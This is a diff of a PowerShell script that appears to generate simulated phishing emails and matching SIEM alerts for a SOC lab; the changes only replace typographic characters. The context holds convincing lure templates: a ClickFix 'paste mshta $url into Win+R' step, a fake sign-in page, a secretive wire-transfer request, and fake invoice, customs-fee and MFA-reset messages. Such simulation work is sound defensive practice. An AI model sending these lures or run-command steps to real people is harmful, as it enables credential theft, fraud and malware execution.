@@ -1,6 +1,6 @@
 # ============================================================
 # Generate-PhishingArtifacts.ps1
-# Internal SOC Team — Phishing Simulation Lab (Defensive Testing Only)
+# Internal SOC Team - Phishing Simulation Lab (Defensive Testing Only)
 # Generates benign phishing EML files and Elastic/SOC JSON alerts
 # ============================================================
 
@@ -15,9 +15,9 @@ param(
 Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 # HELPERS
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 
 function New-Dirs {
     $subdirs = @(
@@ -54,9 +54,9 @@ $SenderDomains = @(
     "invoice-portal.net","mfa-verify.org","shipping-notify.com"
 )
 
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 # EML BUILDER
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 
 function New-EmlContent {
     param(
@@ -95,7 +95,7 @@ Content-Type: multipart/alternative; boundary="alt_$boundary"
 Content-Type: text/plain; charset=UTF-8
 
 $PlainBody
-[SOC SIMULATION — NOT MALICIOUS]
+[SOC SIMULATION - NOT MALICIOUS]
 --alt_$boundary
 Content-Type: text/html; charset=UTF-8
 
@@ -120,9 +120,9 @@ $b64
     return $eml
 }
 
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 # HTML ATTACHMENT TEMPLATES
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 
 function Get-HtmlCredentialPage {
     return @"
@@ -132,13 +132,13 @@ function Get-HtmlCredentialPage {
 <input type="email" placeholder="Email, phone, or Skype">
 <input type="password" placeholder="Password">
 <button class="btn" onclick="window.location.href='$TestBaseUrl?t=cred&a=submit'">Next</button>
-<div class="sim">SOC SIMULATION — No credentials are captured.</div></div></body></html>
+<div class="sim">SOC SIMULATION - No credentials are captured.</div></div></body></html>
 "@
 }
 
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 # EMAIL GENERATORS
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 
 function New-ClickFixEmail {
     $date     = Get-RandomDate
@@ -155,7 +155,7 @@ function New-ClickFixEmail {
 <strong>Security Verification Required</strong><br>Automated bots detected from your network segment.</div>
 <p>Press <strong>Windows + R</strong>, paste the command below, press <strong>Enter</strong>:</p>
 <div style="background:#1e1e1e;color:#4ec9b0;font-family:monospace;padding:14px;border-radius:4px;">mshta $url</div>
-<p style="font-size:11px;color:#aaa;margin-top:20px;">[SOC SIMULATION — CLICKFIX]</p>
+<p style="font-size:11px;color:#aaa;margin-top:20px;">[SOC SIMULATION - CLICKFIX]</p>
 </td></tr></table></div></body></html>
 "@
     $eml = New-EmlContent -FromName "IT Help Desk" -FromEmail $sender -ToEmail "user@$TargetDomain" `
@@ -190,7 +190,7 @@ function New-CredentialHarvestEmail {
 <tr><td style="padding:8px 12px;">Date</td><td style="padding:8px 12px;">$($date.ToString('MMMM dd, yyyy HH:mm UTC'))</td></tr>
 </table>
 <a href="$url" style="display:inline-block;background:#0078d4;color:#fff;padding:10px 24px;text-decoration:none;border-radius:2px;font-size:14px;">Review Recent Activity</a>
-<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — CREDENTIAL HARVEST]</p></div></div></body></html>
+<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION - CREDENTIAL HARVEST]</p></div></div></body></html>
 "@
     $attachContent = Get-HtmlCredentialPage
     $attachments = @(@{Filename="SecureDocument.html"; MimeType="text/html"; Content=$attachContent})
@@ -224,10 +224,10 @@ function New-BECEmail {
     $bank     = Get-RandomElement @("First National Bank","Citibank N.A.","HSBC Holdings","JPMorgan Chase")
     $acct     = "****$(Get-Random -Min 1000 -Max 9999)"
     $ref      = "VENDOR-$(Get-Random -Min 1000 -Max 9999)"
-    $subject  = "Urgent: Wire Transfer — Confidential"
+    $subject  = "Urgent: Wire Transfer - Confidential"
     $html = @"
 <html><body><div style="font-family:Calibri,Arial;font-size:14px;max-width:600px;">
-<p>Hi,</p><p>I need a wire transfer processed today. Time-sensitive — please handle before EOD. Do not discuss with anyone else until completed.</p>
+<p>Hi,</p><p>I need a wire transfer processed today. Time-sensitive - please handle before EOD. Do not discuss with anyone else until completed.</p>
 <table style="border:1px solid #e2e8f0;border-radius:4px;padding:12px;margin:16px 0;border-collapse:collapse;">
 <tr style="background:#f7fafc;"><td style="padding:8px 12px;"><strong>Amount</strong></td><td style="padding:8px 12px;font-size:16px;font-weight:700;color:#e53e3e;">`$$("{0:N0}" -f $amount)</td></tr>
 <tr><td style="padding:8px 12px;"><strong>Bank</strong></td><td style="padding:8px 12px;">$bank</td></tr>
@@ -235,10 +235,10 @@ function New-BECEmail {
 <tr><td style="padding:8px 12px;"><strong>Reference</strong></td><td style="padding:8px 12px;">$ref</td></tr></table>
 <p>I'm in back-to-back meetings but will check messages. Confirm once initiated.</p>
 <p><strong>$exName</strong><br>$exTitle, NovaCorp</p>
-<p style="font-size:10px;color:#aaa;">[SOC SIMULATION — BEC — ]</p>
+<p style="font-size:10px;color:#aaa;">[SOC SIMULATION - BEC - ]</p>
 </div></body></html>
 "@
-    $eml = New-EmlContent -FromName "$exName — $exTitle" -FromEmail $sender -ToEmail "finance@$TargetDomain" `
+    $eml = New-EmlContent -FromName "$exName - $exTitle" -FromEmail $sender -ToEmail "finance@$TargetDomain" `
         -Subject $subject -Date $date -HtmlBody $html `
         -PlainBody "Urgent wire transfer required. Amount: `$$("{0:N0}" -f $amount). Bank: $bank. Ref: $ref. [SOC SIMULATION]"
 
@@ -247,7 +247,7 @@ function New-BECEmail {
     $eml | Out-File -FilePath $fpath -Encoding utf8
 
     return @{type="bec"; file=$fpath; subject=$subject; exec_impersonated="$exName ($exTitle)";
-             sender="$exName — $exTitle <$sender>"; date=$date.ToString("o");
+             sender="$exName - $exTitle <$sender>"; date=$date.ToString("o");
              ioc=@{amount="`$$("{0:N0}" -f $amount)"; bank=$bank; sender_domain=$domain}}
 }
 
@@ -260,18 +260,18 @@ function New-InvoiceEmail {
     $amount   = Get-Random -Min 800 -Max 18000
     $due      = ($date.AddDays(2)).ToString("MMMM dd, yyyy")
     $payUrl   = "$TestBaseUrl/invoice?inv=$invNum&t=POC"
-    $subject  = "OVERDUE: Invoice $invNum — `$$("{0:N0}" -f $amount) Due $due"
+    $subject  = "OVERDUE: Invoice $invNum - `$$("{0:N0}" -f $amount) Due $due"
     $html = @"
 <html><body><div style="font-family:Arial;max-width:600px;margin:0 auto;">
 <div style="background:#1a202c;padding:18px 24px;"><span style="color:#fff;font-size:18px;font-weight:700;">$vendor</span></div>
 <div style="padding:24px;background:#f7fafc;">
-<div style="background:#fff3cd;border:1px solid #ffc107;padding:12px 16px;border-radius:4px;margin-bottom:16px;"><strong>Payment Overdue — Action Required</strong></div>
+<div style="background:#fff3cd;border:1px solid #ffc107;padding:12px 16px;border-radius:4px;margin-bottom:16px;"><strong>Payment Overdue - Action Required</strong></div>
 <table style="width:100%;border-collapse:collapse;margin-bottom:20px;">
 <tr style="background:#fff;"><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;"><strong>Invoice #</strong></td><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;">$invNum</td></tr>
 <tr><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;"><strong>Amount Due</strong></td><td style="padding:10px 0;font-size:20px;font-weight:700;color:#e53e3e;">`$$("{0:N0}" -f $amount).00</td></tr>
 <tr style="background:#fff;"><td style="padding:10px 0;"><strong>Due Date</strong></td><td style="padding:10px 0;color:#e53e3e;">$due (OVERDUE)</td></tr></table>
-<a href="$payUrl" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">Pay Now — Avoid Penalty</a>
-<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — INVOICE PHISHING — ]</p>
+<a href="$payUrl" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">Pay Now - Avoid Penalty</a>
+<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION - INVOICE PHISHING - ]</p>
 </div></div></body></html>
 "@
     $eml = New-EmlContent -FromName "$vendor Billing" -FromEmail $sender -ToEmail "accounts@$TargetDomain" `
@@ -294,19 +294,19 @@ function New-DeliveryEmail {
     $tracking = -join ((1..12) | ForEach-Object { Get-Random -Min 0 -Max 9 })
     $fee      = Get-Random -Min 250 -Max 2500
     $payUrl   = "$TestBaseUrl/delivery?track=$tracking&t=POC"
-    $subject  = "${carrier}: Package Held — Customs Fee Required — #$tracking"
+    $subject  = "${carrier}: Package Held - Customs Fee Required - #$tracking"
     $html = @"
 <html><body><div style="font-family:Arial;max-width:600px;margin:0 auto;">
 <div style="background:#4d148c;padding:16px 24px;"><span style="color:#fff;font-size:20px;font-weight:700;">$carrier</span></div>
 <div style="padding:24px;">
-<h2 style="font-size:16px;color:#333;">Delivery Attempt Failed — Action Required</h2>
+<h2 style="font-size:16px;color:#333;">Delivery Attempt Failed - Action Required</h2>
 <p>Your package requires customs clearance before delivery.</p>
 <div style="border:1px solid #e2e8f0;padding:16px;border-radius:4px;margin:16px 0;">
 <p><strong>Tracking:</strong> $tracking</p>
-<p><strong>Status:</strong> <span style="color:orange;font-weight:600;">HELD — Awaiting Payment</span></p>
-<p><strong>Customs Fee:</strong> <strong style="color:#e53e3e;font-size:18px;">₹$("{0:N0}" -f $fee)</strong></p></div>
+<p><strong>Status:</strong> <span style="color:orange;font-weight:600;">HELD - Awaiting Payment</span></p>
+<p><strong>Customs Fee:</strong> <strong style="color:#e53e3e;font-size:18px;">Rs.$("{0:N0}" -f $fee)</strong></p></div>
 <a href="$payUrl" style="background:#ff6600;color:#fff;padding:10px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Pay Fee &amp; Reschedule Delivery</a>
-<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — DELIVERY PHISHING — ]</p>
+<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION - DELIVERY PHISHING - ]</p>
 </div></div></body></html>
 "@
     $eml = New-EmlContent -FromName "$carrier Delivery" -FromEmail $sender -ToEmail "user@$TargetDomain" `
@@ -318,7 +318,7 @@ function New-DeliveryEmail {
 
     return @{type="delivery"; file=$fpath; subject=$subject; carrier=$carrier; tracking=$tracking;
              sender="$carrier Delivery <$sender>"; date=$date.ToString("o");
-             ioc=@{url=$payUrl; tracking=$tracking; fee="₹$("{0:N0}" -f $fee)"}}
+             ioc=@{url=$payUrl; tracking=$tracking; fee="Rs.$("{0:N0}" -f $fee)"}}
 }
 
 function New-MfaResetEmail {
@@ -327,7 +327,7 @@ function New-MfaResetEmail {
     $sender   = "security-noreply@$domain"
     $token    = ([guid]::NewGuid().ToString("N") + [guid]::NewGuid().ToString("N")).Substring(0,24).ToUpper()
     $verUrl   = "$TestBaseUrl/mfa-reset?token=$token&t=POC"
-    $subject  = "[ACTION REQUIRED] Your MFA Settings Were Changed — Verify Now"
+    $subject  = "[ACTION REQUIRED] Your MFA Settings Were Changed - Verify Now"
     $html = @"
 <html><body><div style="font-family:'Segoe UI',Arial;max-width:600px;margin:0 auto;">
 <div style="background:#0078d4;padding:16px 24px;"><span style="color:#fff;font-size:18px;">IT Security</span></div>
@@ -337,10 +337,10 @@ function New-MfaResetEmail {
 <p>If this was not you, your account may be compromised. Verify your identity immediately.</p>
 <a href="$verUrl" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">Secure My Account Now</a>
 <p style="color:#718096;font-size:13px;margin-top:16px;">This link expires in <strong>15 minutes</strong>.<br>Reference: $($token.Substring(0,12))...</p>
-<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — MFA RESET PHISHING — ]</p>
+<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION - MFA RESET PHISHING - ]</p>
 </div></div></body></html>
 "@
-    $eml = New-EmlContent -FromName "IT Security — Account Alert" -FromEmail $sender -ToEmail "user@$TargetDomain" `
+    $eml = New-EmlContent -FromName "IT Security - Account Alert" -FromEmail $sender -ToEmail "user@$TargetDomain" `
         -Subject $subject -Date $date -HtmlBody $html
 
     $fname = "mfa_reset_$(Get-ShortGuid).eml"
@@ -348,23 +348,23 @@ function New-MfaResetEmail {
     $eml | Out-File -FilePath $fpath -Encoding utf8
 
     return @{type="mfa_reset"; file=$fpath; subject=$subject; token=$token;
-             sender="IT Security — Account Alert <$sender>"; date=$date.ToString("o");
+             sender="IT Security - Account Alert <$sender>"; date=$date.ToString("o");
              ioc=@{url=$verUrl; token_prefix=$token.Substring(0,12)}}
 }
 
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 # SIEM / SOC ALERT GENERATOR
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 
 $AlertMeta = @{
     "clickfix"           = @{rule="Suspicious ClickFix Lure Detected"; severity="high"; mitre="T1566.001"}
-    "credential_harvest" = @{rule="Phishing Link — Credential Harvesting"; severity="high"; mitre="T1566.002"}
+    "credential_harvest" = @{rule="Phishing Link - Credential Harvesting"; severity="high"; mitre="T1566.002"}
     "quishing"           = @{rule="QR Code Phishing (Quishing) Detected"; severity="medium"; mitre="T1566.001"}
     "html_attachment"    = @{rule="Malicious HTML Attachment Phishing"; severity="high"; mitre="T1566.001"}
     "bec"                = @{rule="Business Email Compromise Pattern Detected"; severity="critical"; mitre="T1566.002"}
     "invoice"            = @{rule="Invoice/Payment Phishing Email"; severity="medium"; mitre="T1566.001"}
     "delivery"           = @{rule="Delivery Notification Phishing"; severity="low"; mitre="T1566.001"}
-    "mfa_reset"          = @{rule="MFA Reset Phishing — Urgency Lure"; severity="high"; mitre="T1566.002"}
+    "mfa_reset"          = @{rule="MFA Reset Phishing - Urgency Lure"; severity="high"; mitre="T1566.002"}
 }
 
 function New-ElasticAlert($artifact) {
@@ -420,11 +420,11 @@ function New-SocPayload($artifact, $elastic) {
     }
 }
 
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 # MAIN
-# ─────────────────────────────────────────────────────────────
+# -------------------------------------------------------------
 
-Write-Host "[+] Phishing Artifact Generator — Internal SOC Lab" -ForegroundColor Cyan
+Write-Host "[+] Phishing Artifact Generator - Internal SOC Lab" -ForegroundColor Cyan
 Write-Host "[+] Output   : $OutputDir" -ForegroundColor Gray
 Write-Host "[+] Test URL : $TestBaseUrl" -ForegroundColor Gray
 Write-Host "[+] Samples  : $CountPerType per category`n" -ForegroundColor Gray
